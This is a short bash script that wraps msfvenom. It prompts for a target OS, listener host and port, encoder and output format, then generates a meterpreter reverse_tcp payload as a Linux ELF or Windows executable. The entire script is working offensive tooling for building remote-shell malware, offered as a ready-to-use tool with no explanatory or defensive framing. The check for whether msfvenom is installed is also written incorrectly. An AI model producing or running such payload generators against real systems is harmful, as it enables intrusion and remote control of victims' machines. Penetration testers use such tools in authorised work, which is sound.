#!/bin/bash

if !$(which msfvenom); then
	echo "[!] 'msfvenom' not found"
	exit 1
fi

echo "Select the target OS"
select target_os in linux windows; do
	os=$target_os
	break
done

payload="$os/x64/meterpreter/reverse_tcp"

read -p "LHOST: " lhost
read -p "LPORT: " lport
read -p "Encoder (default = generic/none): " encoder
if [ -z $encoder ]; then encoder="generic/none"; fi

case $os in
	"linux")
		read -p "Format (default = elf): " format
		if [ -z $format ]; then format="elf"; fi
		filename="${os}_${lport}"
		;;
	"windows")
		read -p "Format (default = exe): " format
		if [ -z $format ]; then format="exe"; fi
		filename="${os}_${lport}.${format}"
		;;
	*)
		echo '[!] Wrong OS selected'
		exit 1
		;;
esac

venom_command="msfvenom -p $payload LHOST=$lhost LPORT=$lport -e $encoder -f $format -o $filename"

echo "Executing command: '$venom_command'"
msfvenom -p $payload LHOST=$lhost LPORT=$lport -e $encoder -f $format -o $filename
